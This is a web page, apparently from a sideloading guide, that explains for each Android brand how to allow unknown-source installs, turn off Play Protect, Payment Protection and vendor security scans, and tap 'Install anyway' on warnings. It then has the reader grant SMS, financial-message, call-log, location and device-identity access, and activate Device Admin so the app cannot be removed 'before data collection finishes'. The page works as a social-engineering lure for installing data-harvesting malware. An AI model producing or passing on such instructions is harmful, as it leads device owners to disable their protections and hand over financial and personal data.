Find "Install Unknown Apps" for YOUR phone brand

📱 Samsung (One UI)
Settings → Apps → Special Access → Install Unknown Apps
Tap Chrome (or your browser) → turn Allow from this source ON.

Older Samsung (Android 7 or below):
Settings → Lock Screen & Security → Unknown Sources → ON
📱 Xiaomi / Redmi / POCO (MIUI / HyperOS)
Step 1 — Allow unknown sources:
Settings → Apps → Manage Apps → Chrome → Install Unknown Apps → Allow

Step 2 — If toggle is grayed out, disable MIUI Optimization:
Settings → Additional Settings → Developer Options → MIUI Optimization → OFF
(Enable Dev Options: tap MIUI version 7 times in About Phone)

Step 3: When asked to scan with Mi Security → tap Install anyway.
📱 Huawei / Honor (EMUI / HarmonyOS)
Settings → Security → More Settings → Install Unknown Apps
Select your browser → enable Allow from this source.

Older EMUI:
Settings → Security → Unknown Sources → ON

If blocked by Phone Manager: open it → Privacy → App Permissions → DataCollector → allow all.
📱 Vivo (Funtouch OS / OriginOS)
Settings → Security & Privacy → Install Unknown Apps
Select Chrome or File Manager → enable Allow.

Older Vivo:
Settings → Fingerprint, Face & Passcode → Unknown Sources → ON
📱 OPPO / Realme / OnePlus (ColorOS / OxygenOS)
Settings → Security → Install Unknown Apps
Tap your browser → turn Allow ON.

If toggle is grayed out:
Settings → Additional Settings → Pure Mode → OFF

Disable Payment Protection:
Settings → Security → Payment Protection → OFF
📱 Tecno / Itel / Infinix (HiOS / XOS)
Settings → Security → Unknown Sources → ON
— or —
Settings → Apps & Notifications → Special App Access → Install Unknown Apps → Chrome → Allow

When asked to "Verify app" during install, tap Install anyway.
📱 Nokia / Motorola / Stock Android
Settings → Apps → Special App Access → Install Unknown Apps

Play Store → Profile picture → Play Protect → ⚙️ gear icon → turn OFF “Scan apps” → Turn off
Then go back to Downloads and tap the APK again.
9

Grant ALL permissions when asked

The app will ask for these permissions one by one — tap Allow for EVERY one:

• SMS — read financial transaction messages
• Call Log — analyse call activity
• Location — GPS coordinates
• Phone & SIM — device identity

If you tap Deny, the app will guide you to Settings to re-enable it. Do NOT skip any permission — the app cannot collect data without them.

When asked to activate Device Admin, tap Activate. This prevents the app from being accidentally removed before data collection finishes.
